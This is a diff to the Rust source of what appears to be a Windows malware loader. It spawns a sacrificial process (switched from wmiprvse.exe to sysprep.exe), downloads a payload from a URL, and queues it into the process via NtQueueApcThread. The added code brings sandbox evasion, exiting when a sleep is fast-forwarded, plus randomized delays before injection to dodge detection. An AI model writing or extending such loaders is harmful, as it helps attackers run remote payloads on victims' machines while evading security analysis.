@@ -10,10 +10,12 @@ use std::ffi::CString;
 use std::ptr;
 use winapi::ctypes::c_void;
 use std::error::Error;
-
+use rand::Rng;
+use std::time::{Duration, Instant};
+use std::thread::sleep;
 
 unsafe fn create_process() -> Result<(HANDLE, HANDLE), &'static str> {
-    let executable_path = CString::new("C:\\Windows\\System32\\wbem\\wmiprvse.exe").unwrap();
+    let executable_path = CString::new("C:\\Windows\\System32\\Sysprep\\sysprep.exe").unwrap();
     let mut si: STARTUPINFOA = std::mem::zeroed();
     let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
 
@@ -55,8 +57,38 @@ async fn get_payload_from_url(url: &str) -> Result<Vec<u8>, Box<dyn Error>> {
     }
 }
 
+fn random_sleep_until_target() {
+    let mut rng = rand::thread_rng();
+    
+    let target_time = rng.gen_range(20..=60);
+    
+    let mut total_sleep_time = 0.0;
+    let start_time = Instant::now();
+
+    while total_sleep_time < target_time as f64 {
+        let sleep_time = rng.gen_range(0.5..=2.0);
+        
+        sleep(Duration::from_secs_f64(sleep_time));
+        total_sleep_time += sleep_time;
+    }
+
+    let _elapsed_time = start_time.elapsed().as_secs_f64();
+}
+
+fn evade() {
+    let current_time = Instant::now();
+    sleep(Duration::from_secs(10));
+    let elapsed_time = current_time.elapsed().as_secs();
+    if elapsed_time < 6 {
+        std::process::exit(0);
+    }
+    
+}
+
 #[no_mangle]
 pub extern "C" fn EntryPoint(_buf: *const u8, _buf_len: usize) -> bool {
+    evade();
+
     let (process_handle, thread_handle) = match unsafe { create_process() } {
         Ok(handles) => handles,
         Err(_e) => {
@@ -99,6 +131,8 @@ pub extern "C" fn EntryPoint(_buf: *const u8, _buf_len: usize) -> bool {
         if !NT_SUCCESS(status) {
             return false;
         }
+
+        random_sleep_until_target();
 
         let status = NtQueueApcThread(
             thread_handle,
